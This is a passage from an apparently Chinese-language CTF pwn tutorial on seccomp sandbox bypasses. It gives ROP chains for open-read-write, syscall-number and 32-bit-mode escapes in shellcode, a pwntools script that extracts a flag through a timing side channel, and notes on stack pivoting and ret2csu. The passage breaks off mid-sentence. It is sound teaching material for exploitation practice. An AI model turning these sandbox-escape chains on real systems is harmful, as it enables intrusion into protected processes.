<li><p><code>...</code>：可变参数列表，用于指定要匹配的参数值。对于每个参数，需要指定一个
<code>scmp_arg_cmp</code>
结构体，这个结构体包含了参数的比较方式和比较值。<code>scmp_arg_cmp</code>
结构体定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scmp_arg_cmp</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> arg;	<span class="comment">/**&lt; argument number, starting at 0 */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">scmp_compare</span> <span class="title">op</span>;</span>	<span class="comment">/**&lt; the comparison op, e.g. SCMP_CMP_* */</span></span><br><span class="line">	<span class="type">scmp_datum_t</span> datum_a;</span><br><span class="line">	<span class="type">scmp_datum_t</span> datum_b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>arg</code>：要比较的参数序号，从0开始。</li>
<li><code>op</code>：比较方式，可以是以下值之一：
<ul>
<li><code>SCMP_CMP_NE</code>：不等于</li>
<li><code>SCMP_CMP_EQ</code>：等于</li>
<li><code>SCMP_CMP_LT</code>：小于</li>
<li><code>SCMP_CMP_LE</code>：小于等于</li>
<li><code>SCMP_CMP_GT</code>：大于</li>
<li><code>SCMP_CMP_GE</code>：大于等于</li>
<li><code>SCMP_CMP_MASKED_EQ</code>：按位与运算后等于（比较值为掩码）。</li>
</ul></li>
<li><code>datum_a</code>：用来与参数进行比较的值。</li>
</ul></li>
</ul>
<p>例如下面的代码添加的规则是规定 <code>read</code>
必须从标准输入读取不超过 <code>BUF_SIZE</code> 的内容到 <code>buf</code>
中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 0x100</span></span><br><span class="line">    <span class="type">char</span> buf[BUF_SIZE];</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">3</span>,</span><br><span class="line">                     SCMP_A0(SCMP_CMP_EQ, fileno(<span class="built_in">stdin</span>)),</span><br><span class="line">                     SCMP_A1(SCMP_CMP_EQ, (<span class="type">scmp_datum_t</span>) buf),</span><br><span class="line">                     SCMP_A2(SCMP_CMP_LE, BUF_SIZE));</span><br></pre></td></tr></table></figure></div>
<h2 id="绕过方法">绕过方法</h2>
<h3 id="orw">orw</h3>
<p>一直常见的沙箱类型是禁用 <code>execve</code>
系统调用。这种类型的沙箱通常的绕过方法是劫持控制流通过 rop 或 shellcode
依次调用 <code>open</code> ，<code>read</code> ，<code>write</code>
来完成对 <code>flag</code> 文件的读取和输出。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(file_name_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rsi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(libc.search(asm(<span class="string">&#x27;pop rdx; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br></pre></td></tr></table></figure></div>
<p>32 位下由于 linux
调用约定是外平栈，因此连续函数调用需要在函数返回地址写平栈 gadget 。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p32(libc.search(asm(<span class="string">&#x27;pop ebx; pop esi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p32(file_name_addr)</span><br><span class="line">rop += p32(<span class="number">0</span>)</span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p32(libc.search(asm(<span class="string">&#x27;pop ebx; pop esi; pop edi; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">rop += p32(<span class="number">3</span>)</span><br><span class="line">rop += p32(buf_addr)</span><br><span class="line">rop += p32(<span class="number">0x100</span>)</span><br><span class="line">rop += p32(libc.symbols[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">rop += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop += p32(buf_addr)</span><br></pre></td></tr></table></figure></div>
<h3 id="使用功能相似的系统调用替代">使用功能相似的系统调用替代</h3>
<p>有的题目除了禁用 <code>execve</code> 系统调用外，还可能会禁用
<code>open</code> ，<code>read</code> ，<code>write</code>
这些系统调用。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line">0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line">0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011</span><br><span class="line">0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011</span><br><span class="line">0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011</span><br><span class="line">0008: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0011</span><br><span class="line">0009: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line">0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
<p>对于这种情况我们可以使用可以代替被禁用的系统调用的其他系统调用。</p>
<p>例如 <code>open</code> 的替代系统调用 <code>openat</code>
使用方法如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * #define __NR_openat 257</span></span><br><span class="line"><span class="comment"> * # define AT_FDCWD        -100</span></span><br><span class="line"><span class="comment"> * #define O_RDONLY         00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> fd = syscall(__NR_openat, AT_FDCWD, <span class="string">&quot;main.cpp&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure></div>
<p><strong>需要注意 <code>open</code> 函数实际上是调用了
<code>openat</code> 系统调用。</strong></p>
<h3 id="使用-4-字节系统调用号绕过">使用 4 字节系统调用号绕过</h3>
<p>例如下面这种情况，虽然所有可例用的系统调用号都被禁了，但是由于没有判断
<code>sys_number &gt;= 0x40000000</code> 的情况，因此可以使用
<code>0x40000000|sys_number</code> 来绕过。这里 <code>sys_number</code>
是 64 位的系统调用号。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line">0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line">0003: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line">0004: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0009</span><br><span class="line">0005: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0009</span><br><span class="line">0006: 0x15 0x02 0x00 0x00000101  if (A == openat) goto 0009</span><br><span class="line">0007: 0x15 0x01 0x00 0x00000130  if (A == open_by_handle_at) goto 0009</span><br><span class="line">0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line">0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
<h3 id="使用-32-位-shellcode-绕过">使用 32 位 shellcode 绕过</h3>
<p>例如这道<a class="link" 
 target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/27" >题目<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>，该题目的沙箱规则如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0003</span><br><span class="line"> 0002: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0007</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000001  if (A == write) goto 0006</span><br><span class="line"> 0005: 0x15 0x00 0x01 0x00000005  if (A != fstat) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
<p>可以看到这个沙箱规则没有判断 <code>A != ARCH_X86_64</code>
的情况，因此可以使用如下 shellcode 切换到 32 位完成 orw 。位数切换是通过
retf 指令跨段跳转完成。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov r8, 0x23</span></span><br><span class="line"><span class="string">shl r8, 0x20</span></span><br><span class="line"><span class="string">mov rax, rdi</span></span><br><span class="line"><span class="string">add rax, 0x17</span></span><br><span class="line"><span class="string">or rax, r8</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(payload, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edx, eax</span></span><br><span class="line"><span class="string">push 0x1010101</span></span><br><span class="line"><span class="string">xor dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">push 0x6c662f2e</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov eax, 5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">add edx, 0x22</span></span><br><span class="line"><span class="string">push edx</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(payload, arch=<span class="string">&#x27;i386&#x27;</span>, bits=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode += asm(payload, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br></pre></td></tr></table></figure></div>
<p>这里需要注意的是：</p>
<ul>
<li>rdi 寄存器需要指向 shellcode 的地址。</li>
<li>shellcode 的地址需要小于 0x100000000 。</li>
</ul>
<h3 id="使用-shellcode-侧信道爆破-flag">使用 shellcode 侧信道爆破
flag</h3>
<p>如果沙箱完全禁用了所有 <code>write</code>
相关的系统调用（有的题目是关闭了输出流）则需要采用 shellcode 侧信道爆破
flag 。</p>
<p>例如这道<a class="link" 
 target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/30" >题目<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i></p>
<p>这里有一个判断进程是否退出的技巧：<code>p.recv(timeout=1)</code>
。如果进程已经结束会触发异常，而进程未结束但没有输出导致超时则接收数据长度为
0 ，并不会触发异常。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">c</span>):</span><br><span class="line">    p = process([elf.path])</span><br><span class="line">    shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            push 0x67616c66</span></span><br><span class="line"><span class="string">            mov rdi, rsp</span></span><br><span class="line"><span class="string">            xor esi, esi</span></span><br><span class="line"><span class="string">            push 2</span></span><br><span class="line"><span class="string">            pop rax</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi, rax</span></span><br><span class="line"><span class="string">            mov rsi, rsp</span></span><br><span class="line"><span class="string">            mov edx, 0x100</span></span><br><span class="line"><span class="string">            xor eax, eax</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov dl, [rsp + &#123;&#125;]</span></span><br><span class="line"><span class="string">            cmp dl, &#123;&#125;</span></span><br><span class="line"><span class="string">            jbe $</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span>.<span class="built_in">format</span>(i, c))</span><br><span class="line">    p.send(shellcode)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">        p.kill()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l = <span class="number">0x20</span></span><br><span class="line">    r = <span class="number">0x7f</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> check(m):</span><br><span class="line">            r = m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(l)</span><br><span class="line">    log.info(flag)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<h3 id="使用-close-绕过-fd-参数检查">使用 close 绕过 fd 参数检查</h3>
<p>例如这道<a class="link" 
 target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/33%20xl" >题目<i class="fa-sharp fa-regular fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em]"></i>的沙箱规定
<code>read</code> 的 fd 必须为 0 ，即只能从标准输入读入。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x04 0xc000003e  if (A != ARCH_X86_64) goto 0006</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0005</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0005: 0x25 0x00 0x01 0x00000110  if (A &lt;= 0x110) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0015</span><br><span class="line"> 0010: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line"> 0011: 0x15 0x00 0x04 0x00000000  if (A != 0x0) goto 0016</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0013: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0016</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0015: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0017</span><br><span class="line"> 0016: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure></div>
<p>绕过方法是在 orw 之前先用 rop 调用 <code>close</code>
关闭标准输入，这样再 <code>open</code> 返回的 <code>fd</code> 就是 0
了。</p>
<h1 id="栈迁移">栈迁移</h1>
<p>栈迁移主要是为了解决栈溢出溢出空间大小不足的问题。</p>
<p>通过栈溢出将将栈中的ebp覆盖为fake_ebp-4（64位为fake_ebp-8，因为leave指令mov
esp,ebp之后还有pop
ebp使得esp增加），通过两次leave可以将esp的值改为fake_ebp，从而完成栈迁移，这样就可以在溢出空间不足的情况下构造完整的rop链。</p>
<h2 id="栈迁移到数据填充段">栈迁移到数据填充段</h2>
<p><img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/41c4d94f80c46b5ce1ddd2376a57f3d1.png"
                     
                      
                
                ></p>
<p>将栈迁移到数据填充段中，执行其中的rop。</p>
<h2 id="栈迁移到其它空闲地址">栈迁移到其它空闲地址</h2>
<p><img   
                     lazyload
                     src="/images/loading.svg"
                     data-
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/db12ad52b7a1912665ab0bc5ed002e66.png"
                     
                      
                
                ></p>
<p>调用<code>read</code>函数将rop写入空闲地址中，然后将栈迁移到该地址执行该rop。</p>
<p>这里返回到<code>read</code>函数时会有<code>push ebp</code>保存ebp值，<code>read</code>函数中的<code>leave;ret</code>语句不会对栈迁移造成影响，因此还要再加一个<code>leave;ret</code>。</p>
<h1 id="ret2csu">ret2csu</h1>
<p>在 64 位程序中，函数的前 6
个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的
gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的
gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用
libc 函数，所以这个函数一定会存在。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure></div>
<p>可以看到，如果能够控制 <code>r12</code> 和 <code>r8</code>
